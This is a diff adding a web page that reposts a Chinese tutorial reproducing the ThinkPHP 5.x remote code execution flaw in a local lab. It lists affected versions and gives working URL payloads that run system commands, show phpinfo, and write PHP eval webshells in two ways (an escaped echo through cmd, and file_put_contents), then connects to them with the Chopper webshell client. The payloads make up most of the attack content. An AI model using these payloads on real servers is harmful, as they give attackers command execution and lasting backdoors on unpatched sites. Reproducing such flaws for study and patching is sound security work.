@@ -1,0 +1,65 @@
+<html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='applicable-device' content='pc'><meta name='keywords' content='电脑,电脑讲解,电脑技术,编程,电脑故障维修ThinkPHP 5.x远程命令执行漏洞复现' />
+<script src='../../highlight/highlight.pack.js'></script>
+<link rel='stylesheet' type='text/css' href='../../highlight/styles/monokai.css'/>
+
+<link rel='stylesheet' href='../../fenxiang/dist/css/share.min.css'>
+<script src='../../fenxiang/src/js/social-share.js'></script>
+<script src='../../fenxiang/src/js/qrcode.js'></script>
+
+</head><body><script>hljs.initHighlightingOnLoad();</script><script>
+var system ={};
+var p = navigator.platform;       
+system.win = p.indexOf('Win') == 0;  
+system.mac = p.indexOf('Mac') == 0;  
+system.x11 = (p == 'X11') || (p.indexOf('Linux') == 0);     
+if(system.win||system.mac||system.xll){
+document.write("<link href='../css/3.css' rel='stylesheet' type='text/css'>");}else{ document.write("<link href='../css/3wap.css' rel='stylesheet' type='text/css'>");}</script><script src='../../js/3.js'></script><div class='div2'><div class='heading_nav'><ul><div><li><a href='../../index.html'>首页</a></li>
+</div><div onclick='hidden1()' >分享</div>
+</ul></div></div>
+<div id='heading_nav2'> 
+<li class='row' >
+<div class='social-share' data-mode='prepend'><a href='javascript:' class='social-share-icon icon-heart'></a></div></li></div><script charset='utf-8' src='../../3/js/hengfu.js'></script><script charset='utf-8' src='../../3/js/hengfu2.js'></script><hr><div class='div1'><div class='biaoti'><center>ThinkPHP 5.x远程命令执行漏洞复现</center></div><div class='banquan'>原文出处:本文由博客园博主雨中落叶提供。<br/>
+原文连接:https://www.cnblogs.com/yuzly/p/11460285.html</div><br>
+    <p style="text-align: left;" align="center"><span style="font-size: 18pt; color: #ff0000;">ThinkPHP 5.x远程命令执行漏洞复现</span></p>
+<p><strong><span style="font-size: 18px;">一、漏洞描述</span></strong></p>
+<p><span style="font-size: 15px;">2018年12月10日,ThinkPHP官方发布了安全更新,其中修复了ThinkPHP5框架的一个高危漏洞: https://blog.thinkphp.cn/869075</span></p>
+<p><span style="font-size: 15px;">漏洞的原因是由于框架对控制器名没有进行足够的检测,导致在没有开启强制路由(默认未开启)的情况下可能导致远程代码执行,受影响的版本包括5.0和5.1。</span></p>
+<p><strong><span style="font-size: 18px;">二、漏洞影响版本</span></strong></p>
+<p><span style="font-size: 15px;">Thinkphp 5.x-Thinkphp 5.1.31</span></p>
+<p><span style="font-size: 15px;">Thinkphp 5.0.x&lt;=5.0.23</span></p>
+<p><strong><span style="font-size: 18px;">三、漏洞复现</span></strong></p>
+<p align="left"><span style="font-size: 15px;">1、官网下载Thinkphp 5.0.22,下载地址: <a href="http://www.thinkphp.cn/donate/download/id/1260.html">http://www.thinkphp.cn/donate/download/id/1260.html</a></span></p>
+<p><span style="font-size: 15px;">2、使用phpstudy搭建环境,解压下载的Thinkphp5.0.22到网站目录下,浏览器访问http://192.168.10.171/thinkphp5.0.22/public</span></p>
+<p>　<span style="font-size: 18px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现0.jpg" alt="" /></span>　</p>
+<p><span style="font-size: 15px;">3、利用system函数远程命令执行</span></p>
+<p><span style="font-size: 15px;">Payload如下:</span></p>
+<p><span style="font-size: 15px;">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现1.jpg" alt="" /></span></p>
+<p><span style="font-size: 15px;">4、通过phpinfo函数查看phpinfo()的信息　</span></p>
+<p><span style="font-size: 15px;">Payload如下:</span></p>
+<p><span style="font-size: 15px;">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现2.jpg" alt="" /></span></p>
+<p><span style="font-size: 15px;">5、写入shell</span></p>
+<p><span style="font-size: 15px;">Payload如下:</span></p>
+<p><span style="font-size: 15px;">?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt;shell.php</span></p>
+<p><span style="color: #ff0000; font-size: 15px;">注意:需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不用引号(单引号、双引号),部分字符url编码不编码都行。</span></p>
+<p><span style="color: #ff0000;">　　<span style="font-size: 18px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现3.jpg" alt="" /></span></span></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;<span style="font-size: 15px;">6、查看是否成功写入shell</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现4.jpg" alt="" /></span></p>
+<p>&nbsp;</p>
+<p><span style="font-size: 15px;">7、菜刀连接</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现5.jpg" alt="" /></span></p>
+<p><span style="font-size: 15px;">8、第二种的写入shell的方法</span></p>
+<p><span style="font-size: 15px;">Payload如下:</span></p>
+<p><span style="font-size: 15px;">&nbsp;?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php @eval($_POST[test]);?&gt;</span></p>
+<p>&nbsp;　　<span style="font-size: 15px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现6.jpg" alt="" /></span></p>
+<p><span style="font-size: 15px;">9、查看是否成功写入文件</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现7.jpg" alt="" /></span></p>
+<p><span style="font-size: 15px;">10、菜刀连接</span></p>
+<p>　　<span style="font-size: 18px;"><img src="./images/ThinkPHP 5.x远程命令执行漏洞复现8.jpg" alt="" /></span></p>
+<p>&nbsp;</p>
+
+</div></div><hr><script charset='utf-8' src='../../js/sming.js'></script></body></html>
